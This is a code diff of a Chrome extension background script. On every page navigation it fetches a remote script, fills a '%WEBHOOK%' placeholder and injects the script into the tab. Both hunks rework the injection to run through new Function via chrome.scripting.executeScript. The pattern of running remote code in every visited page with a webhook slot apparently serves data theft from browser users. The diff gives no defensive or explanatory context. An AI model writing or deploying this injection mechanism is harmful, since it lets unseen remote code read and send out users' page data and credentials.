@@ -5,14 +5,15 @@ chrome.webNavigation.onCompleted.addListener(function(details) {
       .then(data => {
         const modifiedData = data.replace('%WEBHOOK%', '123');
         
-        const script = document.createElement('script');
-        script.textContent = modifiedData;
+        const script = `
+          (function() {
+            ${modifiedData}
+          })();
+        `;
 
         chrome.scripting.executeScript({
           target: { tabId: details.tabId },
-          func: () => {
-            document.head.appendChild(script);
-          }
+          func: new Function(script)
         });
       })
       .catch(error => console.error('Error fetching or modifying the script:', error));
@@ -22,14 +23,15 @@ chrome.webNavigation.onCompleted.addListener(function(details) {
       .then(data => {
         const modifiedData = data.replace('%WEBHOOK%', '123');
         
-        const script = document.createElement('script');
-        script.textContent = modifiedData;
+        const script = `
+          (function() {
+            ${modifiedData}
+          })();
+        `;
 
         chrome.scripting.executeScript({
           target: { tabId: details.tabId },
-          func: () => {
-            document.head.appendChild(script);
-          }
+          func: new Function(script)
         });
       })
       .catch(error => console.error('Error fetching or modifying the script:', error));
